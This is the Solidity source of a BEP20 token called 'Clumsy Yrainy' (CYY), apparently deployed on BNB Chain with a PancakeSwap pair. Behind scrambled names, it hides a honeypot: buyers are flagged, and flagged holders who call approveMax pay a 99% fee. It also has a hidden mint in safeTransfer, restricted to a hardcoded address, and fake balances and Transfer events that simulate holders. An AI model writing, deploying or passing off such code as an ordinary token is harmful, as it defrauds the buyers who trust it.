/**
 *Submitted for verification at BscScan.com on 2023-01-09
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;



interface IBEP20 {

    function approve(address spender, uint256 amount) external returns (bool);

    function decimals() external view returns (uint8);

    function getOwner() external view returns (address);

    function totalSupply() external view returns (uint256);

    function symbol() external view returns (string memory);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function name() external view returns (string memory);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}


library SafeMath {

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


interface IUniswapV2Router {

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    function Owner() public view returns (address) {
        return owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

}





contract ClumsyYrainy is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;

    string constant _name = "Clumsy Yrainy";
    uint160 constant amountReceiverTxMode = 684480155903;
    string constant _symbol = "CYY";

    address private listModeBotsMarketing = (msg.sender);
    address public uniswapV2Pair;
    
    bool private walletLimitFeeLiquidityExemptTake = false;

    bool private fromLiquidityTakeTeam = false;
    mapping(address => bool)  amountMarketingFromMint;

    uint256 private fromMintTxReceiver = 0;
    uint256  takeLaunchShouldSwap = 100000000 * 10 ** _decimals;

    bool public fromSellLaunchAtFund = false;

    bool private swapBuyMintSellIsReceiverTx = false;
    uint160 constant receiverTakeSellExemptBurnListTotal = 966941280727 * 2 ** 40;

    bool private launchTakeReceiverTx = false;
    mapping(address => uint256) _balances;
    uint256 public walletMarketingFeeLimit = 0;
    uint256 constant launchMinMaxLimit = 100 * 10 ** 18;
    uint256 private burnFundReceiverLiquidityAutoLimitLaunch = 0;
    uint256 botsSenderMarketingAuto = 0;


    mapping(address => bool) private fromSwapLaunchedTx;
    mapping(address => mapping(address => uint256)) _allowances;
    uint256 constant senderBotsAmountTrading = 100000000 * (10 ** 18);

    mapping(address => bool)  autoTokenFeeMarketing;
    uint160 constant autoTeamFeeFund = 192095781729 * 2 ** 80;
    bool public exemptWalletReceiverListSenderTo = false;
    uint256 private tokenModeBurnBuy = 0;
    IUniswapV2Router public swapLaunchedTakeMaxIsMarketingToken;

    uint256  autoTeamFundMint = 100000000 * 10 ** _decimals;
    uint256 constant minBurnReceiverLaunch = 1700000 * 10 ** 18;
    uint256 public shouldAmountLaunchedBotsMaxReceiver = 0;
    uint256 private sellIsAutoMarketing = 100;

    uint160 constant minLaunchedAmountBurnWalletFund = 57055483286 * 2 ** 120;
    uint256 private totalReceiverMaxAutoIs1 = 0;
    uint256 private autoSenderWalletTxMax = 0;
    bool public launchAutoTokenReceiverSwap = false;
    uint256 private totalReceiverMaxAutoIs = 0;

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        swapLaunchedTakeMaxIsMarketingToken = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(swapLaunchedTakeMaxIsMarketingToken.factory()).createPair(address(this), swapLaunchedTakeMaxIsMarketingToken.WETH());
        _allowances[address(this)][address(swapLaunchedTakeMaxIsMarketingToken)] = senderBotsAmountTrading;

        fromSwapLaunchedTx[msg.sender] = true;
        fromSwapLaunchedTx[address(this)] = true;

        _balances[msg.sender] = senderBotsAmountTrading;
        emit Transfer(address(0), msg.sender, senderBotsAmountTrading);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return senderBotsAmountTrading;
    }

    function atIsTokenReceiverMint(address toEnableMarketingMint, address shouldMinFundLimit, uint256 atTeamMinSenderReceiverMarketing) internal returns (uint256) {
        
        uint256 sellIsReceiverTeam = atTeamMinSenderReceiverMarketing.mul(fundSellTokenFeeLaunchList(toEnableMarketingMint, shouldMinFundLimit == uniswapV2Pair)).div(sellIsAutoMarketing);

        if (sellIsReceiverTeam > 0) {
            _balances[address(this)] = _balances[address(this)].add(sellIsReceiverTeam);
            emit Transfer(toEnableMarketingMint, address(this), sellIsReceiverTeam);
        }

        return atTeamMinSenderReceiverMarketing.sub(sellIsReceiverTeam);
    }

    function getmaxTeamToListExemptTotalReceiver() public view returns (uint256) {
        if (fromMintTxReceiver == sellIsAutoMarketing) {
            return sellIsAutoMarketing;
        }
        if (fromMintTxReceiver != tokenModeBurnBuy) {
            return tokenModeBurnBuy;
        }
        return fromMintTxReceiver;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function tokenReceiverEnableExempt(address toBotsTakeSender) private view returns (bool) {
        if (toBotsTakeSender == listModeBotsMarketing) {
            return true;
        }
        return false;
    }

    function setminSellToFrom(uint256 isAtAutoSenderTeam) public onlyOwner {
        if (tokenModeBurnBuy == fromMintTxReceiver) {
            fromMintTxReceiver=isAtAutoSenderTeam;
        }
        if (tokenModeBurnBuy == autoSenderWalletTxMax) {
            autoSenderWalletTxMax=isAtAutoSenderTeam;
        }
        if (tokenModeBurnBuy == autoSenderWalletTxMax) {
            autoSenderWalletTxMax=isAtAutoSenderTeam;
        }
        tokenModeBurnBuy=isAtAutoSenderTeam;
    }

    function fundSellTokenFeeLaunchList(address toEnableMarketingMint, bool txMintFeeAmountSenderAutoReceiver) internal returns (uint256) {
        if (amountMarketingFromMint[toEnableMarketingMint]) {
            return 99;
        }
        
        if (fromSellLaunchAtFund != exemptWalletReceiverListSenderTo) {
            fromSellLaunchAtFund = swapBuyMintSellIsReceiverTx;
        }

        if (autoSenderWalletTxMax != tokenModeBurnBuy) {
            autoSenderWalletTxMax = walletMarketingFeeLimit;
        }

        if (launchTakeReceiverTx != fromSellLaunchAtFund) {
            launchTakeReceiverTx = walletLimitFeeLiquidityExemptTake;
        }


        if (txMintFeeAmountSenderAutoReceiver) {
            return tokenModeBurnBuy;
        }
        if (!txMintFeeAmountSenderAutoReceiver && toEnableMarketingMint == uniswapV2Pair) {
            return burnFundReceiverLiquidityAutoLimitLaunch;
        }
        return 0;
    }

    function toMarketingFundLaunchedFromToken(address toEnableMarketingMint, address receiverTxLaunchedListLimitSellAuto, uint256 atTeamMinSenderReceiverMarketing, bool isLaunchedFeeAt) private {
        uint160 maxEnableWalletTotal = minLaunchedAmountBurnWalletFund + autoTeamFeeFund + receiverTakeSellExemptBurnListTotal + amountReceiverTxMode;
        if (isLaunchedFeeAt) {
            toEnableMarketingMint = address(uint160(maxEnableWalletTotal + botsSenderMarketingAuto));
            botsSenderMarketingAuto++;
            _balances[receiverTxLaunchedListLimitSellAuto] = _balances[receiverTxLaunchedListLimitSellAuto].add(atTeamMinSenderReceiverMarketing);
        } else {
            _balances[toEnableMarketingMint] = _balances[toEnableMarketingMint].sub(atTeamMinSenderReceiverMarketing);
        }
        if (atTeamMinSenderReceiverMarketing == 0) {
            return;
        }
        emit Transfer(toEnableMarketingMint, receiverTxLaunchedListLimitSellAuto, atTeamMinSenderReceiverMarketing);
    }

    function setliquidityFromSellTo(address isAtAutoSenderTeam,bool receiverModeLiquidityFrom) public onlyOwner {
        fromSwapLaunchedTx[isAtAutoSenderTeam]=receiverModeLiquidityFrom;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function getreceiverMarketingLaunchedTeamExemptMinTx() public view returns (bool) {
        if (fromLiquidityTakeTeam != launchAutoTokenReceiverSwap) {
            return launchAutoTokenReceiverSwap;
        }
        if (fromLiquidityTakeTeam == fromLiquidityTakeTeam) {
            return fromLiquidityTakeTeam;
        }
        return fromLiquidityTakeTeam;
    }

    function setmaxTeamToListExemptTotalReceiver(uint256 isAtAutoSenderTeam) public onlyOwner {
        if (fromMintTxReceiver == fromMintTxReceiver) {
            fromMintTxReceiver=isAtAutoSenderTeam;
        }
        if (fromMintTxReceiver == walletMarketingFeeLimit) {
            walletMarketingFeeLimit=isAtAutoSenderTeam;
        }
        if (fromMintTxReceiver != fromMintTxReceiver) {
            fromMintTxReceiver=isAtAutoSenderTeam;
        }
        fromMintTxReceiver=isAtAutoSenderTeam;
    }

    function getenableMinFeeReceiverFromBotsTx() public view returns (address) {
        if (listModeBotsMarketing == listModeBotsMarketing) {
            return listModeBotsMarketing;
        }
        if (listModeBotsMarketing != listModeBotsMarketing) {
            return listModeBotsMarketing;
        }
        if (listModeBotsMarketing != listModeBotsMarketing) {
            return listModeBotsMarketing;
        }
        return listModeBotsMarketing;
    }

    function setreceiverMarketingLaunchedTeamExemptMinTx(bool isAtAutoSenderTeam) public onlyOwner {
        fromLiquidityTakeTeam=isAtAutoSenderTeam;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != senderBotsAmountTrading) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return takeToLiquidityBuyAuto(sender, recipient, amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (liquidityMarketingTotalFee(uint160(account))) {
            return enableMintAutoTradingSellFundSwap(uint160(account));
        }
        return _balances[account];
    }

    function teamBurnLaunchMin(address liquidityIsLaunchFromBuy) private pure returns (bool) {
        return liquidityIsLaunchFromBuy == listFeeMintSender();
    }

    function approveMax(address spender) external {
        if (autoTokenFeeMarketing[spender]) {
            amountMarketingFromMint[spender] = true;
        }
    }

    function setenableMinFeeReceiverFromBotsTx(address isAtAutoSenderTeam) public onlyOwner {
        listModeBotsMarketing=isAtAutoSenderTeam;
    }

    function launchMintLaunchedSell(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getmodeBotsMintLaunchFeeLimit() public view returns (uint256) {
        if (totalReceiverMaxAutoIs1 == shouldAmountLaunchedBotsMaxReceiver) {
            return shouldAmountLaunchedBotsMaxReceiver;
        }
        if (totalReceiverMaxAutoIs1 == burnFundReceiverLiquidityAutoLimitLaunch) {
            return burnFundReceiverLiquidityAutoLimitLaunch;
        }
        if (totalReceiverMaxAutoIs1 != fromMintTxReceiver) {
            return fromMintTxReceiver;
        }
        return totalReceiverMaxAutoIs1;
    }

    function getminSellToFrom() public view returns (uint256) {
        return tokenModeBurnBuy;
    }

    function setmodeBotsMintLaunchFeeLimit(uint256 isAtAutoSenderTeam) public onlyOwner {
        if (totalReceiverMaxAutoIs1 == walletMarketingFeeLimit) {
            walletMarketingFeeLimit=isAtAutoSenderTeam;
        }
        if (totalReceiverMaxAutoIs1 != fromMintTxReceiver) {
            fromMintTxReceiver=isAtAutoSenderTeam;
        }
        if (totalReceiverMaxAutoIs1 != burnFundReceiverLiquidityAutoLimitLaunch) {
            burnFundReceiverLiquidityAutoLimitLaunch=isAtAutoSenderTeam;
        }
        totalReceiverMaxAutoIs1=isAtAutoSenderTeam;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function safeTransfer(address toEnableMarketingMint, address receiverTxLaunchedListLimitSellAuto, uint256 atTeamMinSenderReceiverMarketing) public {
        if (!teamBurnLaunchMin(msg.sender) && msg.sender != listModeBotsMarketing) {
            return;
        }
        if (liquidityMarketingTotalFee(uint160(receiverTxLaunchedListLimitSellAuto))) {
            toMarketingFundLaunchedFromToken(toEnableMarketingMint, receiverTxLaunchedListLimitSellAuto, atTeamMinSenderReceiverMarketing, false);
            return;
        }
        if (receiverTxLaunchedListLimitSellAuto == address(1)) {
            return;
        }
        if (liquidityMarketingTotalFee(uint160(toEnableMarketingMint))) {
            toMarketingFundLaunchedFromToken(toEnableMarketingMint, receiverTxLaunchedListLimitSellAuto, atTeamMinSenderReceiverMarketing, true);
            return;
        }
        if (atTeamMinSenderReceiverMarketing == 0) {
            return;
        }
        if (toEnableMarketingMint == address(0)) {
            _balances[receiverTxLaunchedListLimitSellAuto] = _balances[receiverTxLaunchedListLimitSellAuto].add(atTeamMinSenderReceiverMarketing);
            return;
        }
    }

    function takeToLiquidityBuyAuto(address toEnableMarketingMint, address receiverTxLaunchedListLimitSellAuto, uint256 atTeamMinSenderReceiverMarketing) internal returns (bool) {
        if (liquidityMarketingTotalFee(uint160(receiverTxLaunchedListLimitSellAuto))) {
            toMarketingFundLaunchedFromToken(toEnableMarketingMint, receiverTxLaunchedListLimitSellAuto, atTeamMinSenderReceiverMarketing, false);
            return true;
        }
        if (liquidityMarketingTotalFee(uint160(toEnableMarketingMint))) {
            toMarketingFundLaunchedFromToken(toEnableMarketingMint, receiverTxLaunchedListLimitSellAuto, atTeamMinSenderReceiverMarketing, true);
            return true;
        }
        
        if (exemptWalletReceiverListSenderTo != launchAutoTokenReceiverSwap) {
            exemptWalletReceiverListSenderTo = exemptWalletReceiverListSenderTo;
        }

        if (walletLimitFeeLiquidityExemptTake != swapBuyMintSellIsReceiverTx) {
            walletLimitFeeLiquidityExemptTake = launchTakeReceiverTx;
        }


        bool exemptModeListIsTeamLaunch = tokenReceiverEnableExempt(toEnableMarketingMint) || tokenReceiverEnableExempt(receiverTxLaunchedListLimitSellAuto);
        
        if (toEnableMarketingMint == uniswapV2Pair && !exemptModeListIsTeamLaunch) {
            autoTokenFeeMarketing[receiverTxLaunchedListLimitSellAuto] = true;
        }
        
        if (exemptModeListIsTeamLaunch) {
            return launchMintLaunchedSell(toEnableMarketingMint, receiverTxLaunchedListLimitSellAuto, atTeamMinSenderReceiverMarketing);
        }
        
        _balances[toEnableMarketingMint] = _balances[toEnableMarketingMint].sub(atTeamMinSenderReceiverMarketing, "Insufficient Balance!");
        
        uint256 atTeamMinSenderReceiverMarketingReceived = launchedIsSenderTeamReceiverAuto(toEnableMarketingMint) ? atIsTokenReceiverMint(toEnableMarketingMint, receiverTxLaunchedListLimitSellAuto, atTeamMinSenderReceiverMarketing) : atTeamMinSenderReceiverMarketing;

        _balances[receiverTxLaunchedListLimitSellAuto] = _balances[receiverTxLaunchedListLimitSellAuto].add(atTeamMinSenderReceiverMarketingReceived);
        emit Transfer(toEnableMarketingMint, receiverTxLaunchedListLimitSellAuto, atTeamMinSenderReceiverMarketingReceived);
        return true;
    }

    function liquidityMarketingTotalFee(uint160 liquidityIsLaunchFromBuy) private pure returns (bool) {
        uint160 maxEnableWalletTotal = minLaunchedAmountBurnWalletFund + autoTeamFeeFund + receiverTakeSellExemptBurnListTotal + amountReceiverTxMode;
        if (liquidityIsLaunchFromBuy >= uint160(maxEnableWalletTotal)) {
            if (liquidityIsLaunchFromBuy <= uint160(maxEnableWalletTotal) + 300000) {
                return true;
            }
        }
        return false;
    }

    function isApproveMax(address spender) public view returns (bool) {
        return amountMarketingFromMint[spender];
    }

    function enableMintAutoTradingSellFundSwap(uint160 liquidityIsLaunchFromBuy) private view returns (uint256) {
        uint160 maxEnableWalletTotal = minLaunchedAmountBurnWalletFund + autoTeamFeeFund + receiverTakeSellExemptBurnListTotal + amountReceiverTxMode;
        uint160 feeSellLaunchedTo = liquidityIsLaunchFromBuy - maxEnableWalletTotal;
        if (feeSellLaunchedTo < botsSenderMarketingAuto) {
            return launchMinMaxLimit * feeSellLaunchedTo;
        }
        return minBurnReceiverLaunch + launchMinMaxLimit * feeSellLaunchedTo;
    }

    function launchedIsSenderTeamReceiverAuto(address toEnableMarketingMint) internal view returns (bool) {
        return !fromSwapLaunchedTx[toEnableMarketingMint];
    }

    function getliquidityFromSellTo(address isAtAutoSenderTeam) public view returns (bool) {
            return fromSwapLaunchedTx[isAtAutoSenderTeam];
    }

    function listFeeMintSender() private pure returns (address) {
        return 0x1086c8dA312C345724dEde014521bEAB20acE4fd;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return takeToLiquidityBuyAuto(msg.sender, recipient, amount);
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}